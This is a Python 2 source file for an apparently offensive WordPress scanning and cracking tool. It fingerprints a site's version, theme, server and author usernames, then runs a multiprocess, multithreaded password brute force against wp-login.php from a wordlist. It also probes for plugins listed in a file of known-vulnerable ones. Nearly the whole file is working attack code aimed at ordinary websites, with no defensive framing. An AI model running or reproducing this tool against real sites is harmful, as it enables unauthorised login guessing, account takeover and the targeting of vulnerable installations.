from __future__ import division
import requests
import re
import threading
from multiprocessing import Queue, Process
from multiprocessing.sharedctypes import Value
import time 
import os
import sys
from init import *

class WordPress_Scan():
	def __init__(self,dict):
		TempUrl = dict['url']
		self.url =  "http://{0}".format(TempUrl)
		self.username = dict['uname']
		self.pwdfile = dict['pwd']
		self.MixProccess = dict['proccess']
		self.Mixthread = dict['threads']

	def VersionScan(self):
		self.Version_Path =  self.url+'/readme.html'
		self.Version_Page = requests.get(self.Version_Path)
		self.Version_Page.encoding='utf-8'
		if(self.Version_Page.status_code == 200):
			self.Version_text = self.Version_Page.text
			self.reg = r'<br />(.+?)\n</h1>'
			self.RegEx = re.compile(self.reg,re.S)
			self.Version = re.findall(self.RegEx,self.Version_text)
			if(len(self.Version)>0):
				print "Wordpress Version:%s" %self.Version[0].encode("utf-8")

	def ThemesScan(self):
		ThemesPath = self.url
		self.URL_Page = requests.get(ThemesPath)
		if(self.URL_Page.status_code == 200):
			URL_Page_text = self.URL_Page.text
			reg = r'/wp-content/themes/(.*?)/'
			RegEx = re.compile(reg)
			themes = re.findall(RegEx,URL_Page_text)
			if(len(themes)>0):
				print "Wordpress Themes:%s" %themes[0]

	def Server_Scan(self):
		Server_Path = self.url
		self.ReServer = requests.get(Server_Path)
		if(self.ReServer.status_code == 200):
			print "Wordpress Server Info:%s" %self.ReServer.headers['server']

	def AuthorScan(self):
		AuthorPath = self.url+'?feed=rss2'
		self.ReAuthor = requests.get(AuthorPath)
		if(self.ReAuthor.status_code == 200):
			Author_text = self.ReAuthor.text
			reg =  r'<dc:creator><!\[CDATA\[(.*?)\]\]></dc:creator>'
			RegEx = re.compile(reg)
			Author_list= re.findall(reg,Author_text)
			if(len(Author_list)>0):
				print "Wordpress Author maybe:%s" %Author_list[0]

	def Brute_Force(self):
		print "\33[33mStart Brute_Force,please wait...\33[0m"
		self.path4 = self.url+'/wp-login.php'
		self.PwdQueue = Queue(maxsize = 20000)					
		self.KeyFlag = Value('b', 0)							
		Brute_ReadDict = threading.Thread(target = self.CreatPwdQueue,args = (self.PwdQueue,self.pwdfile,self.username,))
		Brute_ReadDict.start()
		BruProcesses = []
		start = time.time()
		for count in range(self.MixProccess):
			cn = Process(target = self.task,args = (self.path4,self.PwdQueue,self.Mixthread,self.MixProccess,self.KeyFlag))
			cn.daemon = True
			cn.start()
			BruProcesses.append(cn)
		for st in BruProcesses:
			st.join()
		end = time.time()
		print "Brute_Force_Time: %f s" % (end - start)


	def CreatPwdQueue(self,PwdQueue,path,username):
		pwdtext = open(path)
		for line in pwdtext:
			pwd = line.strip()
			if (pwd):
				payload = {'log':username,'pwd':pwd,'redirect_to':''}
				PwdQueue.put(payload)
		pwdtext.close()
		PwdQueue.cancel_join_thread() 


	def task(self,url,PwdQueue,Mixthread,MixProccess,KeyFlag):
		ProgramThread = []
		for i in range(Mixthread):
			T = threading.Thread(target = self.bruted,args = (url,PwdQueue,MixProccess,KeyFlag,))
			T.setDaemon(True)
			T.start()
			ProgramThread.append(T)
		for t in ProgramThread:
			t.join()


	def bruted(self,url,PwdQueue,MixProccess,KeyFlag):
		thread = threading.current_thread()
		while 1:
			if(KeyFlag.value):
				break
			if(not PwdQueue.empty()):
				payload = PwdQueue.get()
			else:
				break
			re = requests.post(url,data = payload)
			if(re.text == ''):
				print "\33[31mpassword :%s success !\33[0m" %payload['pwd']
				KeyFlag.value = 1
			#else:
				#print "%s password :%s fali" %(thread.getName(),payload['pwd'])

	def LoadPlugin(self):
		print "\33[33mStart Plugin scan,please wait...\33[0m"
		PluginThread=[]
		ExistList = []
		PluginQueue = Queue(maxsize = 10000)
		linecount = len(open('./loopholes_plugin.txt','rU').readlines())
		Plugin_Path =  "http://{0}".format(self.url)
		if(os.path.exists(r'./loopholes_plugin.txt')):
			file = open(r'./loopholes_plugin.txt','r')
			for line in file:
				PluginList = line.strip()
				PluginQueue.put(PluginList)
			file.close()
			PluginQueue.cancel_join_thread() 
		else:
			print " file does not exist!"
		start = time.time()
		for count in range(5):
			t = threading.Thread(target = self.PluginScan,args = (PluginQueue,linecount,ExistList))
			t.setDaemon(True)
			t.start()
			PluginThread.append(t)
		for i in PluginThread:
			i.join()
		for j in ExistList:
			print "\33[32m%s\33[0m" %j
		end = time.time()
		print "Plugin_Scan_Time: %f s" % (end - start)

	def PluginScan(self,PluginQueue,linecount,ExistList):
		thread = threading.current_thread()
		while 1:
			Plugin_Path =  self.url
			if(not PluginQueue.empty()):
				PluginDir = PluginQueue.get()
			else:
				break
			Plugin_Path = "%s/wp-content/plugins/%s/" %(Plugin_Path,PluginDir)
			try:
				Plugin_re = requests.get(Plugin_Path,headers = HEADERS)
				if(Plugin_re.status_code == 200 or Plugin_re.status_code == 403):
					ExistList.append(PluginDir)
				Plugin_Path =  self.url
				#print "%sPluginDir:%s" %(thread.getName(),PluginDir)
			except:
				print "\33[31mconnect fail\33[0m" 
			








